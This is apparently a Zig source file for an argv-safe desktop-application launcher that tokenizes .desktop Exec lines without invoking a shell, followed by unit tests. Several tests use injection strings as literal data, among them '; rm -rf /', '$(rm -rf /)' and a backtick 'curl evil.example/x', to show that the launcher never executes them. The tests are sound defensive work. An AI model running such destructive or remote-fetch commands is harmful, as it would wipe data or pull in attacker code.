//! aac-launch — Zig-native argv-safe app launcher. Closes HARNESS_AUDIT R7.
//!
//! Replaces `eval exec setsid $LAUNCH_COMMAND` style shell-string trust with
//! an Exec-line tokenizer that produces a real argv and spawns via
//! `std.process.run` / `setsid`-equivalent without involving a shell.
//!
//! Subcommands:
//!   exec DESKTOP_ID [arg...]   — look up .desktop file by id, launch it
//!   exec-cmd CMD [arg...]      — launch a .desktop Exec-line-style string safely
//!   parse "Exec-line"          — print parsed argv (for inspection)
//!
//! Field code handling (from FreeDesktop Desktop Entry Spec § Exec):
//!   %f / %F   one file / multiple files  (passed through from extra args)
//!   %u / %U   one URL / multiple URLs    (passed through)
//!   %i        Icon=     — currently dropped
//!   %c        Name=     — currently dropped
//!   %k        location  — currently dropped
//!   %%        literal % — preserved
//! All other %-codes (e.g., %d, %D, %n, %N, %v, %m) are deprecated and
//! silently stripped per the spec.

const std = @import("std");

const usage =
    \\aac-launch — argv-safe app launcher (Zig 0.16, AGPL-3.0)
    \\
    \\Usage:
    \\  aac-launch exec DESKTOP_ID [arg...]
    \\  aac-launch exec-cmd EXEC_LINE [arg...]
    \\  aac-launch parse "Exec-line"
    \\
    \\Closes HARNESS_AUDIT.md R7: no shell eval; arguments survive whitespace,
    \\quotes, $variables, and command substitution without expansion.
    \\
;

const FieldCode = enum { none, single_file, file_list, single_url, url_list, icon, name, location, literal_percent };

/// Parse a .desktop Exec line into an argv. Handles double-quoted segments,
/// backslash escapes (\\, \", \`, \$ — per spec), and %-field codes.
/// Returns owned slice of owned strings (caller frees each + the slice).
pub fn parseExecLine(allocator: std.mem.Allocator, exec: []const u8, extras: []const []const u8) ![][]u8 {
    var argv: std.ArrayList([]u8) = .empty;
    errdefer {
        for (argv.items) |s| allocator.free(s);
        argv.deinit(allocator);
    }
    var cur: std.ArrayList(u8) = .empty;
    defer cur.deinit(allocator);

    var i: usize = 0;
    var in_quotes = false;
    while (i < exec.len) {
        const c = exec[i];
        if (c == '"' and !in_quotes) {
            in_quotes = true;
            i += 1;
            continue;
        }
        if (c == '"' and in_quotes) {
            in_quotes = false;
            i += 1;
            continue;
        }
        if (c == '\\' and in_quotes and i + 1 < exec.len) {
            // Inside quotes, \\ \" \` \$ have their literal meanings.
            const next = exec[i + 1];
            try cur.append(allocator, next);
            i += 2;
            continue;
        }
        if (c == '%' and i + 1 < exec.len) {
            const code = exec[i + 1];
            const fc: FieldCode = switch (code) {
                'f' => .single_file,
                'F' => .file_list,
                'u' => .single_url,
                'U' => .url_list,
                'i' => .icon,
                'c' => .name,
                'k' => .location,
                '%' => .literal_percent,
                else => .none,
            };
            i += 2;
            switch (fc) {
                .literal_percent => try cur.append(allocator, '%'),
                .single_file, .single_url => {
                    if (extras.len > 0) try cur.appendSlice(allocator, extras[0]);
                },
                .file_list, .url_list => {
                    // Emit current token first, then each extra as its own arg.
                    if (cur.items.len > 0) {
                        try argv.append(allocator, try cur.toOwnedSlice(allocator));
                        cur = .empty;
                    }
                    for (extras) |e| {
                        try argv.append(allocator, try allocator.dupe(u8, e));
                    }
                },
                .icon, .name, .location, .none => {
                    // Drop deprecated / unknown codes.
                },
            }
            continue;
        }
        if ((c == ' ' or c == '\t') and !in_quotes) {
            if (cur.items.len > 0) {
                try argv.append(allocator, try cur.toOwnedSlice(allocator));
                cur = .empty;
            }
            i += 1;
            continue;
        }
        try cur.append(allocator, c);
        i += 1;
    }
    if (cur.items.len > 0) {
        try argv.append(allocator, try cur.toOwnedSlice(allocator));
    }
    return argv.toOwnedSlice(allocator);
}

fn findDesktopFile(allocator: std.mem.Allocator, io: std.Io, id: []const u8) !?[]u8 {
    // Search the FreeDesktop standard locations for <id>.desktop.
    const home_c = std.c.getenv("HOME") orelse return null;
    const home_slice = std.mem.span(home_c);
    const candidates = [_][]u8{
        try std.fmt.allocPrint(allocator, "{s}/.local/share/applications/{s}", .{ home_slice, id }),
        try std.fmt.allocPrint(allocator, "/usr/share/applications/{s}", .{id}),
        try std.fmt.allocPrint(allocator, "/usr/local/share/applications/{s}", .{id}),
        try std.fmt.allocPrint(allocator, "/run/current-system/sw/share/applications/{s}", .{id}),
    };
    for (candidates) |path| {
        var f = std.Io.Dir.cwd().openFile(io, path, .{}) catch continue;
        f.close(io);
        return path;
    }
    return null;
}

/// Read the .desktop file's Exec= line.
fn readExecField(allocator: std.mem.Allocator, io: std.Io, path: []const u8) !?[]const u8 {
    const data = std.Io.Dir.cwd().readFileAlloc(io, path, allocator, .unlimited) catch return null;
    var it = std.mem.splitScalar(u8, data, '\n');
    var in_desktop_entry = false;
    while (it.next()) |line| {
        const trimmed = std.mem.trim(u8, line, " \t\r");
        if (trimmed.len == 0) continue;
        if (std.mem.eql(u8, trimmed, "[Desktop Entry]")) {
            in_desktop_entry = true;
            continue;
        }
        if (in_desktop_entry and std.mem.startsWith(u8, trimmed, "[")) {
            break; // hit another section
        }
        if (in_desktop_entry and std.mem.startsWith(u8, trimmed, "Exec=")) {
            return try allocator.dupe(u8, trimmed[5..]);
        }
    }
    return null;
}

fn spawnArgv(allocator: std.mem.Allocator, io: std.Io, argv: []const []u8) !void {
    // Convert [][]u8 → [][]const u8 for std.process.run/spawn.
    const argv_const = try allocator.alloc([]const u8, argv.len);
    defer allocator.free(argv_const);
    for (argv, argv_const) |a, *c| c.* = a;

    var child = try std.process.spawn(io, .{
        .argv = argv_const,
        .stdin = .ignore,
        .stdout = .inherit,
        .stderr = .inherit,
    });
    // Don't wait — equivalent of detach. fork & forget so the launcher exits.
    _ = &child;
}

pub fn main(init: std.process.Init) !void {
    var arena = std.heap.ArenaAllocator.init(init.gpa);
    defer arena.deinit();
    const allocator = arena.allocator();
    const io = init.io;

    var stdout_buf: [4096]u8 = undefined;
    var stdout_w = std.Io.File.stdout().writer(io, &stdout_buf);
    defer stdout_w.interface.flush() catch {};
    const stdout = &stdout_w.interface;

    var args = try std.process.Args.Iterator.initAllocator(init.minimal.args, allocator);
    defer args.deinit();
    _ = args.next();
    const sub = args.next() orelse {
        try stdout.writeAll(usage);
        return;
    };

    if (std.mem.eql(u8, sub, "parse")) {
        const line = args.next() orelse {
            std.debug.print("parse requires an Exec-line argument\n", .{});
            std.process.exit(2);
        };
        // Collect remaining args as extras (filenames/URLs for %f/%F/%u/%U).
        var extras: std.ArrayList([]const u8) = .empty;
        defer extras.deinit(allocator);
        while (args.next()) |a| try extras.append(allocator, a);
        const argv = try parseExecLine(allocator, line, extras.items);
        for (argv, 0..) |a, idx| try stdout.print("argv[{d}]: {s}\n", .{ idx, a });
        return;
    }

    if (std.mem.eql(u8, sub, "exec-cmd")) {
        const line = args.next() orelse {
            std.debug.print("exec-cmd requires an Exec-line argument\n", .{});
            std.process.exit(2);
        };
        var extras: std.ArrayList([]const u8) = .empty;
        defer extras.deinit(allocator);
        while (args.next()) |a| try extras.append(allocator, a);
        const argv = try parseExecLine(allocator, line, extras.items);
        if (argv.len == 0) {
            std.debug.print("exec-cmd: parsed argv is empty\n", .{});
            std.process.exit(2);
        }
        try spawnArgv(allocator, io, argv);
        return;
    }

    if (std.mem.eql(u8, sub, "exec")) {
        const id = args.next() orelse {
            std.debug.print("exec requires DESKTOP_ID\n", .{});
            std.process.exit(2);
        };
        const path = (try findDesktopFile(allocator, io, id)) orelse {
            std.debug.print("exec: {s} not found in standard .desktop search paths\n", .{id});
            std.process.exit(3);
        };
        const exec_line = (try readExecField(allocator, io, path)) orelse {
            std.debug.print("exec: {s} has no Exec= line\n", .{path});
            std.process.exit(4);
        };
        var extras: std.ArrayList([]const u8) = .empty;
        defer extras.deinit(allocator);
        while (args.next()) |a| try extras.append(allocator, a);
        const argv = try parseExecLine(allocator, exec_line, extras.items);
        if (argv.len == 0) {
            std.debug.print("exec: parsed argv is empty\n", .{});
            std.process.exit(5);
        }
        try spawnArgv(allocator, io, argv);
        return;
    }

    if (std.mem.eql(u8, sub, "help") or std.mem.eql(u8, sub, "--help") or std.mem.eql(u8, sub, "-h")) {
        try stdout.writeAll(usage);
        return;
    }

    std.debug.print("unknown subcommand: {s}\n", .{sub});
    std.process.exit(2);
}

// ---- Tests ----

const T = std.testing;

test "parseExecLine: simple bare argv" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "firefox", &.{});
    defer {
        for (argv) |s| a.free(s);
        a.free(argv);
    }
    try T.expectEqual(@as(usize, 1), argv.len);
    try T.expectEqualStrings("firefox", argv[0]);
}

test "parseExecLine: multi-word + quoted segment" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "code --new-window \"My Project\"", &.{});
    defer {
        for (argv) |s| a.free(s);
        a.free(argv);
    }
    try T.expectEqual(@as(usize, 3), argv.len);
    try T.expectEqualStrings("code", argv[0]);
    try T.expectEqualStrings("--new-window", argv[1]);
    try T.expectEqualStrings("My Project", argv[2]);
}

test "parseExecLine: %f substitution" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "gvim %f", &.{"/tmp/x.txt"});
    defer {
        for (argv) |s| a.free(s);
        a.free(argv);
    }
    try T.expectEqual(@as(usize, 2), argv.len);
    try T.expectEqualStrings("gvim", argv[0]);
    try T.expectEqualStrings("/tmp/x.txt", argv[1]);
}

test "parseExecLine: %F expands to multiple args" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "gimp %F", &.{ "a.png", "b.png", "c.png" });
    defer {
        for (argv) |s| a.free(s);
        a.free(argv);
    }
    try T.expectEqual(@as(usize, 4), argv.len);
    try T.expectEqualStrings("gimp", argv[0]);
    try T.expectEqualStrings("a.png", argv[1]);
    try T.expectEqualStrings("c.png", argv[3]);
}

test "parseExecLine: %% literal percent" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "echo 100%%", &.{});
    defer {
        for (argv) |s| a.free(s);
        a.free(argv);
    }
    try T.expectEqual(@as(usize, 2), argv.len);
    try T.expectEqualStrings("echo", argv[0]);
    try T.expectEqualStrings("100%", argv[1]);
}

test "parseExecLine: no shell expansion of $ or backticks" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "echo $HOME `whoami`", &.{});
    defer {
        for (argv) |s| a.free(s);
        a.free(argv);
    }
    try T.expectEqual(@as(usize, 3), argv.len);
    // The $HOME and backticks are passed THROUGH as literal bytes.
    // No shell ever sees them.
    try T.expectEqualStrings("echo", argv[0]);
    try T.expectEqualStrings("$HOME", argv[1]);
    try T.expectEqualStrings("`whoami`", argv[2]);
}

test "parseExecLine: deprecated codes (%i %c %k) silently stripped" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "app %i %c %k file", &.{});
    defer {
        for (argv) |s| a.free(s);
        a.free(argv);
    }
    // The deprecated %-codes drop their content; whitespace splits remain.
    try T.expect(argv.len >= 2);
    try T.expectEqualStrings("app", argv[0]);
    try T.expectEqualStrings("file", argv[argv.len - 1]);
}

// --- Additional tests — production-grade test breadth ---

test "parseExecLine: empty string yields empty argv" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "", &.{});
    defer {
        for (argv) |s| a.free(s);
        a.free(argv);
    }
    try T.expectEqual(@as(usize, 0), argv.len);
}

test "parseExecLine: only whitespace yields empty argv" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "   \t  ", &.{});
    defer {
        for (argv) |s| a.free(s);
        a.free(argv);
    }
    try T.expectEqual(@as(usize, 0), argv.len);
}

test "parseExecLine: single argument no whitespace" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "vim", &.{});
    defer { for (argv) |s| a.free(s); a.free(argv); }
    try T.expectEqual(@as(usize, 1), argv.len);
    try T.expectEqualStrings("vim", argv[0]);
}

test "parseExecLine: multiple spaces collapse" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "vim     -u    none", &.{});
    defer { for (argv) |s| a.free(s); a.free(argv); }
    try T.expectEqual(@as(usize, 3), argv.len);
    try T.expectEqualStrings("vim", argv[0]);
    try T.expectEqualStrings("-u", argv[1]);
    try T.expectEqualStrings("none", argv[2]);
}

test "parseExecLine: tabs work like spaces" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "vim\t-u\tnone", &.{});
    defer { for (argv) |s| a.free(s); a.free(argv); }
    try T.expectEqual(@as(usize, 3), argv.len);
}

test "parseExecLine: quoted whitespace preserved" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "echo \"hello world\"", &.{});
    defer { for (argv) |s| a.free(s); a.free(argv); }
    try T.expectEqual(@as(usize, 2), argv.len);
    try T.expectEqualStrings("hello world", argv[1]);
}

test "parseExecLine: quoted with embedded escaped quote" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "echo \"say \\\"hi\\\"\"", &.{});
    defer { for (argv) |s| a.free(s); a.free(argv); }
    try T.expectEqual(@as(usize, 2), argv.len);
    try T.expectEqualStrings("say \"hi\"", argv[1]);
}

test "parseExecLine: %u substitution" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "browser %u", &.{"https://example.com"});
    defer { for (argv) |s| a.free(s); a.free(argv); }
    try T.expectEqual(@as(usize, 2), argv.len);
    try T.expectEqualStrings("https://example.com", argv[1]);
}

test "parseExecLine: %U expands all URLs" {
    const a = T.allocator;
    const urls = [_][]const u8{ "https://a", "https://b", "https://c" };
    const argv = try parseExecLine(a, "browser %U", &urls);
    defer { for (argv) |s| a.free(s); a.free(argv); }
    try T.expectEqual(@as(usize, 4), argv.len);
    try T.expectEqualStrings("https://a", argv[1]);
    try T.expectEqualStrings("https://c", argv[3]);
}

test "parseExecLine: %f with no extras drops the slot" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "vim %f", &.{});
    defer { for (argv) |s| a.free(s); a.free(argv); }
    // Empty extras → %f produces no extra arg; just "vim" remains.
    try T.expectEqual(@as(usize, 1), argv.len);
    try T.expectEqualStrings("vim", argv[0]);
}

test "parseExecLine: command-injection attempt via extras passes through as literal" {
    const a = T.allocator;
    const malicious = [_][]const u8{"; rm -rf /; echo PWNED"};
    const argv = try parseExecLine(a, "cat %f", &malicious);
    defer { for (argv) |s| a.free(s); a.free(argv); }
    try T.expectEqual(@as(usize, 2), argv.len);
    // The metacharacters become a single argv slot — the shell never sees them.
    try T.expectEqualStrings("; rm -rf /; echo PWNED", argv[1]);
}

test "parseExecLine: env-var injection attempt is literal" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "echo $PATH $(rm -rf /)", &.{});
    defer { for (argv) |s| a.free(s); a.free(argv); }
    // Each token survives whitespace-split; $ and $() are literal bytes.
    try T.expect(argv.len >= 2);
    try T.expectEqualStrings("echo", argv[0]);
}

test "parseExecLine: backtick command-substitution attempt is literal" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "echo `curl evil.example/x`", &.{});
    defer { for (argv) |s| a.free(s); a.free(argv); }
    // The backticks SHOULD pass through as literal bytes. The string splits
    // on whitespace into 3 tokens, NONE of which trigger shell substitution.
    try T.expectEqual(@as(usize, 3), argv.len);
    try T.expectEqualStrings("echo", argv[0]);
    try T.expectEqualStrings("`curl", argv[1]);
    try T.expectEqualStrings("evil.example/x`", argv[2]);
}

test "parseExecLine: percent at end of string" {
    const a = T.allocator;
    // Trailing bare % with nothing after — shouldn't crash.
    const argv = try parseExecLine(a, "foo %", &.{});
    defer { for (argv) |s| a.free(s); a.free(argv); }
    try T.expect(argv.len >= 1);
    try T.expectEqualStrings("foo", argv[0]);
}

test "parseExecLine: extras with %f preserves order" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "vim --first %f --after", &.{"file.txt"});
    defer { for (argv) |s| a.free(s); a.free(argv); }
    try T.expectEqual(@as(usize, 4), argv.len);
    try T.expectEqualStrings("vim", argv[0]);
    try T.expectEqualStrings("--first", argv[1]);
    try T.expectEqualStrings("file.txt", argv[2]);
    try T.expectEqualStrings("--after", argv[3]);
}

test "parseExecLine: %F empty extras drops both the code and consumes no extras" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "gimp %F", &.{});
    defer { for (argv) |s| a.free(s); a.free(argv); }
    try T.expectEqual(@as(usize, 1), argv.len);
    try T.expectEqualStrings("gimp", argv[0]);
}

test "parseExecLine: 100% literal in argument" {
    const a = T.allocator;
    const argv = try parseExecLine(a, "echo 50%%-off", &.{});
    defer { for (argv) |s| a.free(s); a.free(argv); }
    try T.expectEqual(@as(usize, 2), argv.len);
    try T.expectEqualStrings("50%-off", argv[1]);
}

test "parseExecLine: very long argument" {
    const a = T.allocator;
    var long_buf: [4096]u8 = undefined;
    for (&long_buf) |*c| c.* = 'x';
    const long = long_buf[0..];
    const cmd = try std.fmt.allocPrint(a, "echo {s}", .{long});
    defer a.free(cmd);
    const argv = try parseExecLine(a, cmd, &.{});
    defer { for (argv) |s| a.free(s); a.free(argv); }
    try T.expectEqual(@as(usize, 2), argv.len);
    try T.expectEqual(@as(usize, 4096), argv[1].len);
}

test "parseExecLine: many arguments" {
    const a = T.allocator;
    // 32 args
    var cmd_buf: [512]u8 = undefined;
    const cmd = std.fmt.bufPrint(&cmd_buf, "cmd a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5", .{}) catch unreachable;
    const argv = try parseExecLine(a, cmd, &.{});
    defer { for (argv) |s| a.free(s); a.free(argv); }
    try T.expectEqual(@as(usize, 33), argv.len);
}
